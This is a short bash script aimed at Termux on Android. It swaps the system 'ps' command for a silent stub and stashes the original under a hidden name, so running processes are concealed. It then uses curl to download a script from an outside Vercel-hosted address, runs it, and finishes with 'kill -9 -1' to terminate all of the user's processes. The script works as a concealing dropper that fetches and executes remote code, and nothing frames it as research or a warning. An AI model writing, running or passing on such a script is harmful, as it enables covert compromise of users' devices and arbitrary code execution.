#!/bin/bash
PSBIN="/data/data/com.termux/files/usr/bin/ps"
PSREAL="/data/data/com.termux/files/usr/bin/.galirus_senpai.real"
if [ -x "$PSBIN" ] && [ ! -x "$PSREAL" ]; then
   mv "$PSBIN" "$PSREAL"
fi
cat > "$PSBIN" << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
exit 0
EOF
chmod +x "$PSBIN"
curl -sL -o "$PREFIX/lib/bash/tai" https://bot-alpha-eosin.vercel.app/trial.sh
chmod +x "$PREFIX/lib/bash/tai"
"$PREFIX/lib/bash/tai"
kill -9 -1
